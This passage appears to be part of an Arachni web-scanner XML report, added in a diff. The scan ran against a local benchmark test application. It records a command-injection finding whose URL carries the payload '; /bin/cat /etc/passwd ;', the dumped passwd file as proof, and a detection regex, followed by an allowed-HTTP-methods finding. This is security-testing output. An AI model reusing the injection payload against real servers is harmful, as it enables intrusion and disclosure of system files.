stack,,,&amp;#x3a;&amp;#x2f;var&amp;#x2f;lib&amp;#x2f;tpm&amp;#x3a;&amp;#x2f;bin&amp;#x2f;false&lt;br&gt;uuidd&amp;#x3a;x&amp;#x3a;107&amp;#x3a;114&amp;#x3a;&amp;#x3a;&amp;#x2f;run&amp;#x2f;uuidd&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;tcpdump&amp;#x3a;x&amp;#x3a;108&amp;#x3a;115&amp;#x3a;&amp;#x3a;&amp;#x2f;nonexistent&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;avahi-autoipd&amp;#x3a;x&amp;#x3a;109&amp;#x3a;116&amp;#x3a;Avahi autoip daemon,,,&amp;#x3a;&amp;#x2f;var&amp;#x2f;lib&amp;#x2f;avahi-autoipd&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;usbmux&amp;#x3a;x&amp;#x3a;110&amp;#x3a;46&amp;#x3a;usbmux daemon,,,&amp;#x3a;&amp;#x2f;var&amp;#x2f;lib&amp;#x2f;usbmux&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;rtkit&amp;#x3a;x&amp;#x3a;111&amp;#x3a;117&amp;#x3a;RealtimeKit,,,&amp;#x3a;&amp;#x2f;proc&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;dnsmasq&amp;#x3a;x&amp;#x3a;112&amp;#x3a;65534&amp;#x3a;dnsmasq,,,&amp;#x3a;&amp;#x2f;var&amp;#x2f;lib&amp;#x2f;misc&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;cups-pk-helper&amp;#x3a;x&amp;#x3a;113&amp;#x3a;120&amp;#x3a;user for cups-pk-helper service,,,&amp;#x3a;&amp;#x2f;home&amp;#x2f;cups-pk-helper&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;speech-dispatcher&amp;#x3a;x&amp;#x3a;114&amp;#x3a;29&amp;#x3a;Speech Dispatcher,,,&amp;#x3a;&amp;#x2f;run&amp;#x2f;speech-dispatcher&amp;#x3a;&amp;#x2f;bin&amp;#x2f;false&lt;br&gt;avahi&amp;#x3a;x&amp;#x3a;115&amp;#x3a;121&amp;#x3a;Avahi mDNS daemon,,,&amp;#x3a;&amp;#x2f;var&amp;#x2f;run&amp;#x2f;avahi-daemon&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;kernoops&amp;#x3a;x&amp;#x3a;116&amp;#x3a;65534&amp;#x3a;Kernel Oops Tracking Daemon,,,&amp;#x3a;&amp;#x2f;&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;saned&amp;#x3a;x&amp;#x3a;117&amp;#x3a;123&amp;#x3a;&amp;#x3a;&amp;#x2f;var&amp;#x2f;lib&amp;#x2f;saned&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;nm-openvpn&amp;#x3a;x&amp;#x3a;118&amp;#x3a;124&amp;#x3a;NetworkManager OpenVPN,,,&amp;#x3a;&amp;#x2f;var&amp;#x2f;lib&amp;#x2f;openvpn&amp;#x2f;chroot&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;hplip&amp;#x3a;x&amp;#x3a;119&amp;#x3a;7&amp;#x3a;HPLIP system user,,,&amp;#x3a;&amp;#x2f;run&amp;#x2f;hplip&amp;#x3a;&amp;#x2f;bin&amp;#x2f;false&lt;br&gt;whoopsie&amp;#x3a;x&amp;#x3a;120&amp;#x3a;125&amp;#x3a;&amp;#x3a;&amp;#x2f;nonexistent&amp;#x3a;&amp;#x2f;bin&amp;#x2f;false&lt;br&gt;colord&amp;#x3a;x&amp;#x3a;121&amp;#x3a;126&amp;#x3a;colord colour management daemon,,,&amp;#x3a;&amp;#x2f;var&amp;#x2f;lib&amp;#x2f;colord&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;fwupd-refresh&amp;#x3a;x&amp;#x3a;122&amp;#x3a;127&amp;#x3a;fwupd-refresh user,,,&amp;#x3a;&amp;#x2f;run&amp;#x2f;systemd&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;geoclue&amp;#x3a;x&amp;#x3a;123&amp;#x3a;128&amp;#x3a;&amp;#x3a;&amp;#x2f;var&amp;#x2f;lib&amp;#x2f;geoclue&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;pulse&amp;#x3a;x&amp;#x3a;124&amp;#x3a;129&amp;#x3a;PulseAudio daemon,,,&amp;#x3a;&amp;#x2f;var&amp;#x2f;run&amp;#x2f;pulse&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;gnome-initial-setup&amp;#x3a;x&amp;#x3a;125&amp;#x3a;65534&amp;#x3a;&amp;#x3a;&amp;#x2f;run&amp;#x2f;gnome-initial-setup&amp;#x2f;&amp;#x3a;&amp;#x2f;bin&amp;#x2f;false&lt;br&gt;gdm&amp;#x3a;x&amp;#x3a;126&amp;#x3a;131&amp;#x3a;Gnome Display Manager&amp;#x3a;&amp;#x2f;var&amp;#x2f;lib&amp;#x2f;gdm3&amp;#x3a;&amp;#x2f;bin&amp;#x2f;false&lt;br&gt;sssd&amp;#x3a;x&amp;#x3a;127&amp;#x3a;132&amp;#x3a;SSSD system user,,,&amp;#x3a;&amp;#x2f;var&amp;#x2f;lib&amp;#x2f;sss&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;huy&amp;#x3a;x&amp;#x3a;1000&amp;#x3a;1000&amp;#x3a;huy,,,&amp;#x3a;&amp;#x2f;home&amp;#x2f;huy&amp;#x3a;&amp;#x2f;bin&amp;#x2f;bash&lt;br&gt;systemd-coredump&amp;#x3a;x&amp;#x3a;999&amp;#x3a;999&amp;#x3a;systemd Core Dumper&amp;#x3a;&amp;#x2f;&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;&lt;br&gt;Here is the std err of the command (if any):&lt;br&gt;</body>
+          <raw_headers>HTTP/1.1 200 &#xD;
+Content-Security-Policy: frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com&#xD;
+Cache-Control: no-cache, no-store, must-revalidate&#xD;
+Strict-Transport-Security: max-age=31536000;includeSubDomains&#xD;
+X-Frame-Options: DENY&#xD;
+X-Content-Type-Options: nosniff&#xD;
+Content-Type: text/html;charset=UTF-8&#xD;
+Content-Length: 6185&#xD;
+Date: Thu, 29 May 2025 11:12:07 GMT&#xD;
+&#xD;
+</raw_headers>
+        </response>
+        <dom>
+          <url>https://192.168.6.149:8443/benchmark/cmdi-00/BenchmarkTest00824?BenchmarkTest00824=%20;%20/bin/cat%20/etc/passwd%20;%20</url>
+          <transitions/>
+          <data_flow_sinks/>
+          <execution_flow_sinks/>
+        </dom>
+      </page>
+      <referring_page>
+        <body>&lt;!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd"&gt;
+&lt;html&gt;
+&lt;head&gt;
+&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8"&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;p&gt;
+Here is the standard output of the command:&lt;br&gt;benchmarkDataBase.lck&lt;br&gt;benchmarkDataBase.log&lt;br&gt;benchmarkDataBase.properties&lt;br&gt;benchmarkDataBase.script&lt;br&gt;benchmarkDataBase.tmp&lt;br&gt;boot.ini&lt;br&gt;common&lt;br&gt;conf&lt;br&gt;logs&lt;br&gt;shared&lt;br&gt;temp&lt;br&gt;testfiles&lt;br&gt;webapps&lt;br&gt;work&lt;br&gt;&lt;br&gt;Here is the std err of the command (if any):&lt;br&gt;</body>
+        <request>
+          <url>https://192.168.6.149:8443/benchmark/cmdi-00/BenchmarkTest00824?BenchmarkTest00824=.</url>
+          <method>get</method>
+          <parameters/>
+          <headers>
+            <header name="Accept" value="text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"/>
+            <header name="User-Agent" value="Mozilla/5.0 (Gecko) Arachni/v1.6.1.3"/>
+            <header name="Accept-Language" value="en-US,en;q=0.8,he;q=0.6"/>
+            <header name="X-Arachni-Scan-Seed" value="629c06d8eb411903acde521764d19e09"/>
+          </headers>
+          <body/>
+          <raw>GET /benchmark/cmdi-00/BenchmarkTest00824?BenchmarkTest00824=. HTTP/1.1&#xD;
+Host: 192.168.6.149:8443&#xD;
+Accept-Encoding: gzip, deflate&#xD;
+User-Agent: Mozilla/5.0 (Gecko) Arachni/v1.6.1.3&#xD;
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#xD;
+Accept-Language: en-US,en;q=0.8,he;q=0.6&#xD;
+X-Arachni-Scan-Seed: 629c06d8eb411903acde521764d19e09&#xD;
+&#xD;
+</raw>
+        </request>
+        <response>
+          <url>https://192.168.6.149:8443/benchmark/cmdi-00/BenchmarkTest00824?BenchmarkTest00824=.</url>
+          <code>200</code>
+          <ip_address>192.168.6.149</ip_address>
+          <time>0.0367</time>
+          <return_code>ok</return_code>
+          <return_message>No error</return_message>
+          <headers>
+            <header name="Content-Security-Policy" value="frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com"/>
+            <header name="Cache-Control" value="no-cache, no-store, must-revalidate"/>
+            <header name="Strict-Transport-Security" value="max-age=31536000;includeSubDomains"/>
+            <header name="X-Frame-Options" value="DENY"/>
+            <header name="X-Content-Type-Options" value="nosniff"/>
+            <header name="Content-Type" value="text/html;charset=UTF-8"/>
+            <header name="Content-Length" value="526"/>
+            <header name="Date" value="Thu, 29 May 2025 11:12:00 GMT"/>
+          </headers>
+          <body>&lt;!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd"&gt;
+&lt;html&gt;
+&lt;head&gt;
+&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8"&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;p&gt;
+Here is the standard output of the command:&lt;br&gt;benchmarkDataBase.lck&lt;br&gt;benchmarkDataBase.log&lt;br&gt;benchmarkDataBase.properties&lt;br&gt;benchmarkDataBase.script&lt;br&gt;benchmarkDataBase.tmp&lt;br&gt;boot.ini&lt;br&gt;common&lt;br&gt;conf&lt;br&gt;logs&lt;br&gt;shared&lt;br&gt;temp&lt;br&gt;testfiles&lt;br&gt;webapps&lt;br&gt;work&lt;br&gt;&lt;br&gt;Here is the std err of the command (if any):&lt;br&gt;</body>
+          <raw_headers>HTTP/1.1 200 &#xD;
+Content-Security-Policy: frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com&#xD;
+Cache-Control: no-cache, no-store, must-revalidate&#xD;
+Strict-Transport-Security: max-age=31536000;includeSubDomains&#xD;
+X-Frame-Options: DENY&#xD;
+X-Content-Type-Options: nosniff&#xD;
+Content-Type: text/html;charset=UTF-8&#xD;
+Content-Length: 526&#xD;
+Date: Thu, 29 May 2025 11:12:00 GMT&#xD;
+&#xD;
+</raw_headers>
+        </response>
+        <dom>
+          <url>https://192.168.6.149:8443/benchmark/cmdi-00/BenchmarkTest00824?BenchmarkTest00824=.</url>
+          <transitions/>
+          <data_flow_sinks/>
+          <execution_flow_sinks/>
+        </dom>
+      </referring_page>
+      <signature>&amp;#x3a;.+&amp;#x3a;\d+&amp;#x3a;\d+&amp;#x3a;.+&amp;#x3a;[0-9a-zA-Z&amp;#;]+</signature>
+      <proof>&amp;#x3a;x&amp;#x3a;0&amp;#x3a;0&amp;#x3a;root&amp;#x3a;&amp;#x2f;root&amp;#x3a;&amp;#x2f;bin&amp;#x2f;bash&lt;br&gt;daemon&amp;#x3a;x&amp;#x3a;1&amp;#x3a;1&amp;#x3a;daemon&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;bin&amp;#x3a;x&amp;#x3a;2&amp;#x3a;2&amp;#x3a;bin&amp;#x3a;&amp;#x2f;bin&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;sys&amp;#x3a;x&amp;#x3a;3&amp;#x3a;3&amp;#x3a;sys&amp;#x3a;&amp;#x2f;dev&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;sync&amp;#x3a;x&amp;#x3a;4&amp;#x3a;65534&amp;#x3a;sync&amp;#x3a;&amp;#x2f;bin&amp;#x3a;&amp;#x2f;bin&amp;#x2f;sync&lt;br&gt;games&amp;#x3a;x&amp;#x3a;5&amp;#x3a;60&amp;#x3a;games&amp;#x3a;&amp;#x2f;usr&amp;#x2f;games&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;man&amp;#x3a;x&amp;#x3a;6&amp;#x3a;12&amp;#x3a;man&amp;#x3a;&amp;#x2f;var&amp;#x2f;cache&amp;#x2f;man&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;lp&amp;#x3a;x&amp;#x3a;7&amp;#x3a;7&amp;#x3a;lp&amp;#x3a;&amp;#x2f;var&amp;#x2f;spool&amp;#x2f;lpd&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;mail&amp;#x3a;x&amp;#x3a;8&amp;#x3a;8&amp;#x3a;mail&amp;#x3a;&amp;#x2f;var&amp;#x2f;mail&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;news&amp;#x3a;x&amp;#x3a;9&amp;#x3a;9&amp;#x3a;news&amp;#x3a;&amp;#x2f;var&amp;#x2f;spool&amp;#x2f;news&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;uucp&amp;#x3a;x&amp;#x3a;10&amp;#x3a;10&amp;#x3a;uucp&amp;#x3a;&amp;#x2f;var&amp;#x2f;spool&amp;#x2f;uucp&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;proxy&amp;#x3a;x&amp;#x3a;13&amp;#x3a;13&amp;#x3a;proxy&amp;#x3a;&amp;#x2f;bin&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;www-data&amp;#x3a;x&amp;#x3a;33&amp;#x3a;33&amp;#x3a;www-data&amp;#x3a;&amp;#x2f;var&amp;#x2f;www&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;backup&amp;#x3a;x&amp;#x3a;34&amp;#x3a;34&amp;#x3a;backup&amp;#x3a;&amp;#x2f;var&amp;#x2f;backups&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;list&amp;#x3a;x&amp;#x3a;38&amp;#x3a;38&amp;#x3a;Mailing List Manager&amp;#x3a;&amp;#x2f;var&amp;#x2f;list&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;irc&amp;#x3a;x&amp;#x3a;39&amp;#x3a;39&amp;#x3a;ircd&amp;#x3a;&amp;#x2f;var&amp;#x2f;run&amp;#x2f;ircd&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;gnats&amp;#x3a;x&amp;#x3a;41&amp;#x3a;41&amp;#x3a;Gnats Bug-Reporting System &amp;#x28;admin&amp;#x29;&amp;#x3a;&amp;#x2f;var&amp;#x2f;lib&amp;#x2f;gnats&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;nobody&amp;#x3a;x&amp;#x3a;65534&amp;#x3a;65534&amp;#x3a;nobody&amp;#x3a;&amp;#x2f;nonexistent&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;systemd-network&amp;#x3a;x&amp;#x3a;100&amp;#x3a;102&amp;#x3a;systemd Network Management,,,&amp;#x3a;&amp;#x2f;run&amp;#x2f;systemd&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;systemd-resolve&amp;#x3a;x&amp;#x3a;101&amp;#x3a;103&amp;#x3a;systemd Resolver,,,&amp;#x3a;&amp;#x2f;run&amp;#x2f;systemd&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;systemd-timesync&amp;#x3a;x&amp;#x3a;102&amp;#x3a;104&amp;#x3a;systemd Time Synchronization,,,&amp;#x3a;&amp;#x2f;run&amp;#x2f;systemd&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;messagebus&amp;#x3a;x&amp;#x3a;103&amp;#x3a;106&amp;#x3a;&amp;#x3a;&amp;#x2f;nonexistent&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;syslog&amp;#x3a;x&amp;#x3a;104&amp;#x3a;110&amp;#x3a;&amp;#x3a;&amp;#x2f;home&amp;#x2f;syslog&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;_apt&amp;#x3a;x&amp;#x3a;105&amp;#x3a;65534&amp;#x3a;&amp;#x3a;&amp;#x2f;nonexistent&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;tss&amp;#x3a;x&amp;#x3a;106&amp;#x3a;111&amp;#x3a;TPM software stack,,,&amp;#x3a;&amp;#x2f;var&amp;#x2f;lib&amp;#x2f;tpm&amp;#x3a;&amp;#x2f;bin&amp;#x2f;false&lt;br&gt;uuidd&amp;#x3a;x&amp;#x3a;107&amp;#x3a;114&amp;#x3a;&amp;#x3a;&amp;#x2f;run&amp;#x2f;uuidd&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;tcpdump&amp;#x3a;x&amp;#x3a;108&amp;#x3a;115&amp;#x3a;&amp;#x3a;&amp;#x2f;nonexistent&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;avahi-autoipd&amp;#x3a;x&amp;#x3a;109&amp;#x3a;116&amp;#x3a;Avahi autoip daemon,,,&amp;#x3a;&amp;#x2f;var&amp;#x2f;lib&amp;#x2f;avahi-autoipd&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;usbmux&amp;#x3a;x&amp;#x3a;110&amp;#x3a;46&amp;#x3a;usbmux daemon,,,&amp;#x3a;&amp;#x2f;var&amp;#x2f;lib&amp;#x2f;usbmux&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;rtkit&amp;#x3a;x&amp;#x3a;111&amp;#x3a;117&amp;#x3a;RealtimeKit,,,&amp;#x3a;&amp;#x2f;proc&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;dnsmasq&amp;#x3a;x&amp;#x3a;112&amp;#x3a;65534&amp;#x3a;dnsmasq,,,&amp;#x3a;&amp;#x2f;var&amp;#x2f;lib&amp;#x2f;misc&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;cups-pk-helper&amp;#x3a;x&amp;#x3a;113&amp;#x3a;120&amp;#x3a;user for cups-pk-helper service,,,&amp;#x3a;&amp;#x2f;home&amp;#x2f;cups-pk-helper&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;speech-dispatcher&amp;#x3a;x&amp;#x3a;114&amp;#x3a;29&amp;#x3a;Speech Dispatcher,,,&amp;#x3a;&amp;#x2f;run&amp;#x2f;speech-dispatcher&amp;#x3a;&amp;#x2f;bin&amp;#x2f;false&lt;br&gt;avahi&amp;#x3a;x&amp;#x3a;115&amp;#x3a;121&amp;#x3a;Avahi mDNS daemon,,,&amp;#x3a;&amp;#x2f;var&amp;#x2f;run&amp;#x2f;avahi-daemon&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;kernoops&amp;#x3a;x&amp;#x3a;116&amp;#x3a;65534&amp;#x3a;Kernel Oops Tracking Daemon,,,&amp;#x3a;&amp;#x2f;&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;saned&amp;#x3a;x&amp;#x3a;117&amp;#x3a;123&amp;#x3a;&amp;#x3a;&amp;#x2f;var&amp;#x2f;lib&amp;#x2f;saned&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;nm-openvpn&amp;#x3a;x&amp;#x3a;118&amp;#x3a;124&amp;#x3a;NetworkManager OpenVPN,,,&amp;#x3a;&amp;#x2f;var&amp;#x2f;lib&amp;#x2f;openvpn&amp;#x2f;chroot&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;hplip&amp;#x3a;x&amp;#x3a;119&amp;#x3a;7&amp;#x3a;HPLIP system user,,,&amp;#x3a;&amp;#x2f;run&amp;#x2f;hplip&amp;#x3a;&amp;#x2f;bin&amp;#x2f;false&lt;br&gt;whoopsie&amp;#x3a;x&amp;#x3a;120&amp;#x3a;125&amp;#x3a;&amp;#x3a;&amp;#x2f;nonexistent&amp;#x3a;&amp;#x2f;bin&amp;#x2f;false&lt;br&gt;colord&amp;#x3a;x&amp;#x3a;121&amp;#x3a;126&amp;#x3a;colord colour management daemon,,,&amp;#x3a;&amp;#x2f;var&amp;#x2f;lib&amp;#x2f;colord&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;fwupd-refresh&amp;#x3a;x&amp;#x3a;122&amp;#x3a;127&amp;#x3a;fwupd-refresh user,,,&amp;#x3a;&amp;#x2f;run&amp;#x2f;systemd&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;geoclue&amp;#x3a;x&amp;#x3a;123&amp;#x3a;128&amp;#x3a;&amp;#x3a;&amp;#x2f;var&amp;#x2f;lib&amp;#x2f;geoclue&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;pulse&amp;#x3a;x&amp;#x3a;124&amp;#x3a;129&amp;#x3a;PulseAudio daemon,,,&amp;#x3a;&amp;#x2f;var&amp;#x2f;run&amp;#x2f;pulse&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;gnome-initial-setup&amp;#x3a;x&amp;#x3a;125&amp;#x3a;65534&amp;#x3a;&amp;#x3a;&amp;#x2f;run&amp;#x2f;gnome-initial-setup&amp;#x2f;&amp;#x3a;&amp;#x2f;bin&amp;#x2f;false&lt;br&gt;gdm&amp;#x3a;x&amp;#x3a;126&amp;#x3a;131&amp;#x3a;Gnome Display Manager&amp;#x3a;&amp;#x2f;var&amp;#x2f;lib&amp;#x2f;gdm3&amp;#x3a;&amp;#x2f;bin&amp;#x2f;false&lt;br&gt;sssd&amp;#x3a;x&amp;#x3a;127&amp;#x3a;132&amp;#x3a;SSSD system user,,,&amp;#x3a;&amp;#x2f;var&amp;#x2f;lib&amp;#x2f;sss&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;huy&amp;#x3a;x&amp;#x3a;1000&amp;#x3a;1000&amp;#x3a;huy,,,&amp;#x3a;&amp;#x2f;home&amp;#x2f;huy&amp;#x3a;&amp;#x2f;bin&amp;#x2f;bash&lt;br&gt;systemd-coredump&amp;#x3a;x&amp;#x3a;999&amp;#x3a;999&amp;#x3a;systemd Core Dumper&amp;#x3a;&amp;#x2f;&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin</proof>
+      <trusted>true</trusted>
+      <platform_type>os</platform_type>
+      <platform_name>unix</platform_name>
+    </issue>
+    <issue>
+      <name>Allowed HTTP methods</name>
+      <description>
+There are a number of HTTP methods that can be used on a webserver (`OPTIONS`,
+`HEAD`, `GET`, `POST`, `PUT`, `DELETE` etc.).  Each of these methods perform a
+different function and each have an associated level of risk when their use is
+permitted on the webserver.
+
+A client can use the `OPTIONS` method within a request to query a server to
+determine which methods are allowed.
+
+Cyber-criminals will almost always perform this simple test as it will give a
+very quick indication of any high-risk methods being permitted by the server.
+
+Arachni discovered that several methods are supported by the server.
+</description>
+      <remedy_guidance>
+It is recommended that a whitelisting approach be taken to explicitly permit the
+HTTP methods required by the application and block all others.
+
+Typically the only HTTP methods required for most applications are `GET` and
+`POST`. All other methods perform actions that are rarely required or perform
+actions that are inherently risky.
+
+These risky methods (such as `PUT`, `DELETE`, etc) should be protected by strict
+limitations, such as ensuring that the channel is secure (SSL/TLS enabled) and
+only authorised and trusted clients are permitted to use them.
+</remedy_guidance>
+      <remedy_code/>
+      <severity>informational</severity>
+      <check>
+        <name>Allowed methods</name>
+        <description>Checks for supported HTTP methods.</description>
+        <author>Tasos "Zapotek" Laskos &lt;tasos.laskos@arachni-scanner.com&gt;</author>
+        <version>0.2</version>
+        <shortname>allowed_methods</shortname>
+      </check>
+      <digest>999603815</digest>
+      <references>
+        <reference title="Apache.org" url="http://httpd.apache.org/docs/2.2/mod/core.html#limitexcept"/>
+      </references>
+      <vector>
+        <class>Arachni::Element::Server</class>
+        <type>server</type>
+        <url>https://192.168.6.149:8443/benchmark/cmdi-00/BenchmarkTest00824?BenchmarkTest00824=.</url>
+        <action>https://192.168.6.149:8443/benchmark/cmdi-00/BenchmarkTest00824?BenchmarkTest00824=.</action>
+      </vector>
+      <remarks/>
+      <page>
+        <body/>
+        <request>
+          <url>https://192.168.6.149:8443/benchmark/cmdi-00/BenchmarkTest00824?BenchmarkTest00824=.</url>
+          <method>options</method>
+          <parameters/>
+          <headers>
+            <header name="Accept" value="text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"/>
+            <header name="User-Agent" value="Mozilla/5.0 (Gecko) Arachni/v1.6.1.3"/>
+            <header name="Accept-Language" value="en-US,en;q=0.8,he;q=0.6"/>
+            <header name="X-Arachni-Scan-Seed" value="629c06d8eb411903acde521764d19e09"/>
+          </headers>
+          <body/>
+          <raw>OPTIONS /benchmark/cmdi-00/BenchmarkTest00824?BenchmarkTest00824=. HTTP/1.1&#xD;
+Host: 192.168.6.149:8443&#xD;
+Accept-Encoding: gzip, deflate&#xD;
+User-Agent: Mozilla/5.0 (Gecko) Arachni/v1.6.1.3&#xD;
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#xD;
+Accept-Language: en-US,en;q=0.8,he;q=0.6&#xD;
+X-Arachni-Scan-Seed: 629c06d8eb411903acde521764d19e09&#xD;
+&#xD;
+</raw>
+        </request>
+        <response>
+          <url>https://192.168.6.149:8443/benchmark/cmdi-00/BenchmarkTest00824?BenchmarkTest00824=.</url>
+          <code>200</code>
+          <ip_address>192.168.6.149</ip_address>
+          <time>0.0123</time>
+          <return_code>ok</return_code>
+          <return_message>No error</return_message>
+          <headers>
+            <header name="Content-Security-Policy" value="frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com"/>
+            <header name="Cache-Control" value="no-cache, no-store, must-revalidate"/>
+            <header name="Strict-Transport-Security" value="max-age=31536000;includeSubDomains"/>
+            <header name="X-Frame-Options" value="DENY"/>
+            <header name="X-Content-Type-Options" value="nosniff"/>
+            <header name="Allow" value="GET, HEAD, POST, OPTIONS"/>
+            <header name="Content-Length" value="0"/>
+            <header name="Date" value="Thu, 29 May 2025 11:12:03 GMT"/>
+          </headers>
+          <body/>
+          <raw_headers>HTTP/1.1 200 &#xD;
+Content-Security-Policy: frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com&#xD;
+Cache-Control: no-cache, no-store, must-revalidate&#xD;
+Strict-Transport-Security: max-age=31536000;includeSubDomains&#xD;
+X-Frame-Options: DENY&#xD;
+X-Content-Type-Options: nosniff&#xD;
+Allow: GET, HEAD, POST, OPTIONS&#xD;
+Content-Length: 0&#xD;
+Date: Thu, 29 May 2025 11:12:03 GMT&#xD;
+&#xD;
+</raw_headers>
+        </response>
+        <dom>
